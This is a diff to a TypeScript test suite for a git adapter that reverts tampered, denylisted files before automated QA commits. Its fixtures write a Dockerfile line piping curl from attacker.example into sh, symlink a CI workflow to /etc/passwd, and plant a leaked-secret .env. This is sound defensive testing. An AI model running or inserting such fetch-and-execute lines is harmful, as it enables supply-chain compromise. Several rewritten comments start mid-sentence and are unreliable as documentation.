@@ -1,4 +1,4 @@
-// test/contexts/workspace-and-publication/infrastructure/vcs-write.adapter.test.ts
+/* test/contexts/workspace-and-publication/infrastructure/vcs-write.adapter.test.ts */
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
@@ -26,13 +26,11 @@ test("push force-with-leases the branch to origin", async () => {
   assert.ok(calls[0]?.includes("qa/e2e-abc"));
 });
 
-// PROD-BLOCKER fix: the rewritten publish path never staged/committed/pushed the agent's generated
-// tests before calling GitHub's PR API (VcsWriteAdapter was never instantiated in composition-root
-// — grep-confirmed zero references outside this test file). Widening this adapter with the
-// remaining legacy git-mechanics primitives (src/integrations/publish.ts's publishChanges: checkout
-// -B, status-check/skip-if-no-changes, and the local-exclude write) so it becomes the complete git
-// side of publish — reused by the PublicationPortAdapter "pr" route (publication-port.adapter.ts)
-// via a duck-typed collaborator interface, never a direct import (arch-lint confinement).
+/* The publish path must stage/commit/push the agent's generated tests before calling GitHub's PR
+   API. This adapter owns checkout -B, status-check/skip-if-no-changes, and the local-exclude write
+   — the complete git side of publish — reused by the PublicationPortAdapter "pr" route via a
+   duck-typed collaborator interface, never a direct import (arch-lint confinement).
+ */
 
 test("checkoutBranch creates/resets the branch with checkout -B", async () => {
   const calls: string[][] = [];
@@ -70,16 +68,8 @@ test("writeExcludes writes gitignore-style patterns to .git/info/exclude (local,
   assert.deepEqual(writes[0], { dir: "/m", patterns: ["node_modules/", ".qa/coverage/"] });
 });
 
-// ── FIX 1 (sdd/security-hardening, judgment-day round 2, CRITICAL) — real git fixture, commit()'s
-// OWN tracked-file guard, in isolation ──────────────────────────────────────────────────────────
-//
-// These fixtures deliberately do NOT go through buildVcsPublish/CODE_PUBLISH_EXCLUDES (see
-// rewritten-engine-factory.publish-excludes.test.ts's own note on why a "rename INTO a denylisted
-// destination" fixture at that composition level would be shadowed by that file's OWN, separate
-// exclude-file defense for a brand-new path) — this file pins commit()'s diff-parsing correctness
-// directly: a denylisted staged path must be reverted regardless of its git status (M/D/T/R, and a
-// COPY's new path arrives as a plain A — see the COPIED-not-renamed fixture below for why "C" itself
-// is unreachable with the adapter's own `-M`-only diff invocation), never re-enumerated by status code.
+/* commit()'s own tracked-file guard, in isolation — not via buildVcsPublish excludes.
+   A denylisted staged path must be reverted regardless of git status (M/D/T/R). */
 function initRepo(): string {
   const repo = mkdtempSync(join(tmpdir(), "qa-vcswrite-"));
   const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
@@ -96,11 +86,11 @@ function realGitFn(repo: string): (args: string[], cwd?: string) => Promise<stri
       return execFileSync("git", args, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).toString();
     } catch (e) {
       const err = e as { stdout?: string; stderr?: string };
-      // judgment-day round 3 (ALSO, Judge B): `??` only falls back on null/undefined — git commonly
-      // writes a real, non-empty message to stdout ("nothing to commit, working tree clean") while
-      // stderr is the EMPTY STRING (not absent), so `err.stderr ?? err.stdout` previously picked the
-      // empty stderr and threw an error with no message content at all. `||` treats an empty stderr
-      // as absent too, correctly falling through to stdout.
+      /* writes a real, non-empty message to stdout ("nothing to commit, working tree clean") while
+         stderr is the EMPTY STRING (not absent), so `err.stderr ?? err.stdout` previously picked the
+         empty stderr and threw an error with no message content at all. `||` treats an empty stderr
+         as absent too, correctly falling through to stdout.
+       */
       throw new Error(`git ${args.join(" ")} failed: ${err.stderr || err.stdout || String(e)}`);
     }
   };
@@ -119,7 +109,7 @@ test("real git fixture: a DELETED tracked denylisted file (D status) is reverted
     execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
 
     unlinkSync(join(repo, "Dockerfile"));
-    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n"); // legitimate control
+    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n");
 
     const adapter = new VcsWriteAdapter(realGitFn(repo));
     await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);
@@ -144,7 +134,7 @@ test("real git fixture: a tracked denylisted file TYPECHANGED into a symlink (T 
 
     unlinkSync(join(repo, ".github", "workflows", "ci.yml"));
     symlinkSync("/etc/passwd", join(repo, ".github", "workflows", "ci.yml"));
-    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n"); // legitimate control
+    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n");
 
     const adapter = new VcsWriteAdapter(realGitFn(repo));
     await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);
@@ -168,11 +158,12 @@ test("real git fixture: a legitimate file RENAMED into a denylisted destination 
     execFileSync("git", ["add", "-A"], { cwd: repo });
     execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
 
-    // No exclude-file layer here (unlike buildVcsPublish's CODE_PUBLISH_EXCLUDES) — "Dockerfile" is
-    // a genuinely NEW, non-ignored path, so git's own content-similarity detection pairs it as a
-    // rename ("R") once staged, exercising commit()'s R rename-unit branch directly.
+    /* No exclude-file layer here (unlike buildVcsPublish's CODE_PUBLISH_EXCLUDES) — "Dockerfile" is
+       a genuinely NEW, non-ignored path, so git's own content-similarity detection pairs it as a
+       rename ("R") once staged, exercising commit()'s R rename-unit branch directly.
+     */
     renameSync(join(repo, "legit.ts"), join(repo, "Dockerfile"));
-    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); // legitimate control (survives the revert)
+    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); /* legitimate control (survives the revert) */
 
     const adapter = new VcsWriteAdapter(realGitFn(repo));
     await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);
@@ -189,22 +180,21 @@ test("real git fixture: a legitimate file RENAMED into a denylisted destination 
   }
 });
 
-// judgment-day round 3 (ALSO, Judge A) — CORRECTED round 4 (FIX VI, both judges): commit()'s
-// `git diff --cached --name-status -M` (no `-C`) can NEVER emit a "C" (copy) status line — `-M`
-// enables ONLY rename detection; copy detection requires the SEPARATE `-C` flag. The round-3 comment
-// claimed "-M -C emits C100" — BOTH judges reproduced this as FALSE: `-M -C` alone still emits
-// "A"/"M" for this exact fixture, identically to `-M` alone (verified empirically here too). Copy
-// detection only actually fires once `--find-copies-harder` is added on top of `-M -C` — git's
-// default `-C` scan scope only compares files ADDED in the same diff against each other, and the
-// untouched pre-existing copy source in this fixture is outside that default scope. The engineering
-// conclusion is unaffected: this adapter's own diff invocation never passes `-C` (with or without
-// `--find-copies-harder`), so "C" was unreachable either way, and the `status?.[0] === "C"` branch
-// was therefore dead code, and this file's own header/test-file comments overclaimed "M/D/T/R/C"
-// coverage. Not exploitable — a copy's new path is still caught by the single-path fallback branch,
-// exactly as this fixture proves — but the dead branch is removed rather than left promising
-// coverage the code never provides. This fixture is the proof: a copy INTO a denylisted destination
-// (new path, untouched source) is reverted via the ordinary single-path branch, with no R/C handling
-// involved at all.
+/* `git diff --cached --name-status -M` (no `-C`) can NEVER emit a "C" (copy) status line — `-M`
+   enables ONLY rename detection; copy detection requires the SEPARATE `-C` flag. `-M -C` alone
+   still emits "A"/"M" for this exact fixture, identically to `-M` alone (verified empirically). Copy
+   detection only actually fires once `--find-copies-harder` is added on top of `-M -C` — git's
+   default `-C` scan scope only compares files ADDED in the same diff against each other, and the
+   untouched pre-existing copy source in this fixture is outside that default scope. The engineering
+   conclusion is unaffected: this adapter's own diff invocation never passes `-C` (with or without
+   `--find-copies-harder`), so "C" was unreachable either way, and the `status?.[0] === "C"` branch
+   was therefore dead code, and this file's own header/test-file comments overclaimed "M/D/T/R/C"
+   coverage. Not exploitable — a copy's new path is still caught by the single-path fallback branch,
+   exactly as this fixture proves — but the dead branch is removed rather than left promising
+   coverage the code never provides. This fixture is the proof: a copy INTO a denylisted destination
+   (new path, untouched source) is reverted via the ordinary single-path branch, with no R/C handling
+   involved at all.
+ */
 test("real git fixture: a NEW file COPIED (not renamed) into a denylisted destination is reverted via the ordinary single-path branch — 'C' status is unreachable with -M alone", async () => {
   const originalContent = "export const legit = 1;\n";
   const repo = initRepo();
@@ -214,9 +204,9 @@ test("real git fixture: a NEW file COPIED (not renamed) into a denylisted destin
     execFileSync("git", ["add", "-A"], { cwd: repo });
     execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
 
-    // legit.ts is left in place (untouched) — this is a COPY, not a rename/move.
+    /* legit.ts is left in place (untouched) — this is a COPY, not a rename/move. */
     copyFileSync(join(repo, "legit.ts"), join(repo, "Dockerfile"));
-    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); // legitimate control (survives the revert)
+    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); /* legitimate control (survives the revert) */
 
     const adapter = new VcsWriteAdapter(realGitFn(repo));
     await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);
@@ -233,10 +223,7 @@ test("real git fixture: a NEW file COPIED (not renamed) into a denylisted destin
   }
 });
 
-// ── FIX 3 (sdd/security-hardening, judgment-day round 2, HIGH, both judges) — the revert must
-// never be silent: a supply-chain tamper reverted underneath a run must leave a trace (logged
-// loudly) and be surfaced to the caller (returned) so it can be threaded into gateSignals.
-// confinement — a run must never reach verdict:pass/auto-merge with a silently-reverted tamper.
+/* A reverted tamper must never be silent: log it and return the paths for gateSignals. */
 
 test("commit() logs loudly AND returns the reverted denylisted paths when a tamper is detected (never silent)", async () => {
   const repo = initRepo();
@@ -250,7 +237,7 @@ test("commit() logs loudly AND returns the reverted denylisted paths when a tamp
     execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
 
     writeFileSync(join(repo, "Dockerfile"), "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
-    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); // legitimate control (survives the revert)
+    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); /* legitimate control (survives the revert) */
 
     const adapter = new VcsWriteAdapter(realGitFn(repo));
     const result = await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);
@@ -266,14 +253,13 @@ test("commit() logs loudly AND returns the reverted denylisted paths when a tamp
   }
 });
 
-// judgment-day round 4 (FIX III, Judge B): commit()'s REAL revertedDangerous filter (`revertedDenylisted
-// .filter((p) => this.pathDecoder.isDangerousPath(p))`, vcs-write.adapter.ts:161) had ZERO coverage
-// through the real adapter — Judge B mutated it to just `revertedDenylisted` (the round-2 bug, no
-// filtering at all) and the FULL SUITE (3693 tests) still passed, because every existing test that pins
-// revertedDangerous's VALUE does so against a mocked publish() stub that hardcodes the correct answer,
-// never the real filter. This fixture stages a Dockerfile tamper (denylisted, but not secret-tier) AND
-// a `.env` tamper (denylisted AND dangerous) in ONE commit through the real adapter + real git, and
-// pins that revertedDangerous is the proper SUBSET, not an alias for revertedDenylisted.
+/* .filter((p) => this.pathDecoder.isDangerousPath(p))`, vcs-write.adapter.ts:161) had ZERO coverage
+   filtering at all) and the FULL SUITE (3693 tests) still passed, because every existing test that pins
+   revertedDangerous's VALUE does so against a mocked publish() stub that hardcodes the correct answer,
+   never the real filter. This fixture stages a Dockerfile tamper (denylisted, but not secret-tier) AND
+   a `.env` tamper (denylisted AND dangerous) in ONE commit through the real adapter + real git, and
+   pins that revertedDangerous is the proper SUBSET, not an alias for revertedDenylisted.
+ */
 test("real git fixture: revertedDangerous is the real isDangerousPath SUBSET of revertedDenylisted, not an alias (Judge B's mutation reproduction)", async () => {
   const repo = initRepo();
   try {
@@ -283,8 +269,9 @@ test("real git fixture: revertedDangerous is the real isDangerousPath SUBSET of 
     execFileSync("git", ["add", "-A"], { cwd: repo });
     execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
 
-    // Both tampers land in the SAME staged diff, alongside a legitimate control file that survives
-    // the revert (so `git commit` has something left to commit).
+    /* Both tampers land in the SAME staged diff, alongside a legitimate control file that survives
+       the revert (so `git commit` has something left to commit).
+     */
     writeFileSync(join(repo, "Dockerfile"), "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
     writeFileSync(join(repo, ".env"), "SECRET=leaked\n");
     writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n");
@@ -330,11 +317,11 @@ test("commit() returns an empty revertedDenylisted array (never logs) when nothi
   }
 });
 
-// ── ALSO (judgment-day round 2, both judges) — an all-tamper diff (every staged change is
-// denylisted and reverted) leaves nothing for `git commit` to commit; the raw git error ("nothing
-// to commit, working tree clean") surfaces all the way up through runner.ts's top-level catch as
-// "unexpected internal error (not infrastructure — investigate)", misdirecting triage toward a code
-// bug instead of naming what actually happened: a security guard blocked every staged path.
+/* denylisted and reverted) leaves nothing for `git commit` to commit; the raw git error ("nothing
+   to commit, working tree clean") surfaces all the way up through runner.ts's top-level catch as
+   "unexpected internal error (not infrastructure — investigate)", misdirecting triage toward a code
+   bug instead of naming what actually happened: a security guard blocked every staged path.
+ */
 
 test("commit() enriches the 'nothing to commit' error to name the security guard, when every staged path was denylisted and reverted", async () => {
   const repo = initRepo();
@@ -343,8 +330,9 @@ test("commit() enriches the 'nothing to commit' error to name the security guard
     execFileSync("git", ["add", "-A"], { cwd: repo });
     execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
 
-    // The ONLY staged change is the denylisted tamper — no legitimate control file survives the
-    // revert, so nothing remains for `git commit` to commit.
+    /* The ONLY staged change is the denylisted tamper — no legitimate control file survives the
+       revert, so nothing remains for `git commit` to commit.
+     */
     writeFileSync(join(repo, "Dockerfile"), "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
 
     const adapter = new VcsWriteAdapter(realGitFn(repo));
@@ -361,12 +349,12 @@ test("commit() enriches the 'nothing to commit' error to name the security guard
   }
 });
 
-// judgment-day round 3 (ALSO, Judge B): the enrichment above is gated on `revertedDenylisted.length
-// > 0` — an UNRELATED commit failure (nothing denylisted at all) must surface the raw git error,
-// unenriched, exactly as before this fix. Previously unpinned; this fixture reproduces the same
-// underlying git error ("nothing to commit, working tree clean") via a genuinely empty diff — no
-// denylist involvement whatsoever — so the negative branch of the `if (revertedDenylisted.length >
-// 0)` guard is actually exercised, not just assumed correct by symmetry with the positive case above.
+/* > 0` — an UNRELATED commit failure (nothing denylisted at all) must surface the raw git error,
+   unenriched, exactly as before this fix. Previously unpinned; this fixture reproduces the same
+   underlying git error ("nothing to commit, working tree clean") via a genuinely empty diff — no
+   denylist involvement whatsoever — so the negative branch of the `if (revertedDenylisted.length >
+   0)` guard is actually exercised, not just assumed correct by symmetry with the positive case above.
+ */
 test("commit() surfaces an unrelated commit failure (nothing denylisted) as the RAW git error, never enriched with security-guard language", async () => {
   const repo = initRepo();
   try {
@@ -374,8 +362,9 @@ test("commit() surfaces an unrelated commit failure (nothing denylisted) as the 
     execFileSync("git", ["add", "-A"], { cwd: repo });
     execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
 
-    // No working-tree changes at all — `git add -- .` stages nothing, so `git commit` fails with
-    // "nothing to commit" for a reason that has NOTHING to do with the denylist guard.
+    /* No working-tree changes at all — `git add -- .` stages nothing, so `git commit` fails with
+       "nothing to commit" for a reason that has NOTHING to do with the denylist guard.
+     */
     const adapter = new VcsWriteAdapter(realGitFn(repo));
     await assert.rejects(
       () => adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked),
